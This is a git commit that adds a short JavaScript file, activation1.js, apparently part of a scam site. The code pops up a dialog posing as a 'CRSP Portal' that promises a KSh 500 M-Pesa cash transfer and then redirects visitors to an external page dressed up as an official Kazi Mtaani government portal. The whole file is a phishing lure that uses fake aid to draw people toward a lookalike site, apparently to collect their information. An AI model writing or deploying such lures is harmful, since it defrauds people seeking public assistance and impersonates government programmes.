b3846838d8aa55892b0e7cb7a1508143ac5ce07a
clmmoni <kkween1.00@gmail.com>
2025-10-06 23:20:31 +0100

    Create activation1.js

---
+++ activation1.js
@@ -0,0 +1,5 @@
+var password = 'Submit Now'
+password=prompt('CRSP Portal: Congratulations, you are eligible to receive the KSh 500 M-Pesa Cash Transfer, Kindly press OK to submit your information and receive KSh 500 now ','Submit Now');
+if (password != 'Submit Now') {
+location.href='https://get-it-online.site/Official-Kazi-Mtaani-Portal.html';
+}
